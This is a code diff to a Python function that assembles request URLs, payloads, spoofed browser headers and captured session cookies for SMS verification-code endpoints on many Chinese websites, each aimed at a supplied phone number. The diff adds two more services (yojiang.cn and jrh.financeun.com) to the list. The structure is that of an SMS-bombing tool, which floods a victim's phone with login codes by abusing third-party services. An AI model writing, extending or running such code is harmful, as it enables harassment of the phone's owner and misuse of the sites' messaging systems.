@@ -1,5 +1,5 @@
 
-Get=['sxk','hc','rsk','cemo','s399']
+Get=['sxk','hc','rsk','cemo','s399','yj','jrh']
 def preparingnumber(number):
     game_url = 'https://m.bigplayers.com/api/user/v1/smsCode/sendLoginSmsV2'
     game_payload = {
@@ -314,6 +314,53 @@ def preparingnumber(number):
     }
     S399=[s399_url, s399_payload, s399_headers]
 
+    yj_url=f'https://www.yojiang.cn/api/user/send_verify_code?phone={number}'
+    yj_payload = {
+        "phone": number
+    }
+    yj_headers ={
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
+        "connection": "keep-alive",
+        "cookie": "guest_uuid=68a157db1b91620ba03e1673; Hm_lvt_b8feb3bac8c21f12c39b6af852dd50f4=1755404252; Hm_lpvt_b8feb3bac8c21f12c39b6af852dd50f4=1755404252; HMACCOUNT=FF4E43BDD4FFE36E",
+        "host": "www.yojiang.cn",
+        "referer": "https://www.yojiang.cn/",
+        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
+    }
+    Yj=[yj_url, yj_payload, yj_headers]    
+
+    jrh_url=f'https://jrh.financeun.com/Login/sendMessageCode3.html?mobile={number}&mbid=197858&check=3'
+    jrh_payload ={
+        "mobile":number,
+        "mbid": "197858",
+        "check": "3"
+    }
+    jrh_headers ={
+        "accept": "*/*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
+        "cookie": "PHPSESSID=gec5518lhtbmv0r4h0lta245e7; jrh_visit_log=gec5518lhtbmv0r4h0lta245e7; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1755410535; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1755410535; HMACCOUNT=FF4E43BDD4FFE36E",
+        "priority": "u=1, i",
+        "referer": "https://jrh.financeun.com/",
+        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
+        "x-requested-with": "XMLHttpRequest"
+    }
+    Jrh=[jrh_url, jrh_payload, jrh_headers]
+
     conclusion={'game': Game,'hxx': Hxx,'kuaishou': Ks,'sdc': Sdc,'sjzg': Sjzg,'sxk': Sxk,
-                'zmn': Zmn,'hc': Hc,'rsk': Rsk,'xz': Xz,'cemo': Cemo,'s399': S399}
+                'zmn': Zmn,'hc': Hc,'rsk': Rsk,'xz': Xz,'cemo': Cemo,'s399': S399,'yj': Yj,'jrh': Jrh
+                }
     return conclusion
